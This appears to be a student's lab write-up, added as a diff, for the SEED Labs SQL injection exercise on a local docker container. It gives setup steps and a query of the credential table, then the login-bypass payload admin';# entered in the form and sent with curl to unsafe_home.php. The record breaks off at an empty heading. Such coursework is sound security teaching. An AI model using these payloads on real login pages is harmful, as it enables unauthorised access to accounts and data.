@@ -1,0 +1,29 @@
+* Setup 
+*** cd category-web/Web_SQL_Injection/Labsetup
+*** docker-compose up
+*** add 10.9.0.5 with host name www.seed-server.com in /etc/hosts file in the host machine
+*** Go to www.seed-server.com and if you find the login page then the setup is complete
+
+
+* Task 1 
+*** docker exec -it mysql-10.9.0.6 /bin/bash
+*** mysql -u root -pdees
+*** use sqllab_users;
+*** show tables;
+*** select * from credential where Name='Alice';
+*** Get the screenshot
+
+#+CAPTION: Employee Record of Alice 
+[[./screenshots/task-1-alice-record.png]]
+
+
+* Task 2
+
+** Task 2.1
+*** Type {{admin';#}} in the username field and anything in the password field
+#+CAPTION: Login as admin
+[[./screenshots/task-2_1-login-admin.png]]
+** Task 2.2
+*** curl -s 'www.seed-server.com/unsafe_home.php?username=admin%27%3b%23&Password=123'
+*** Run [[./scripts/task-2_2.sh]] to automatically verify whether the request can get you logged as admin.
+** 
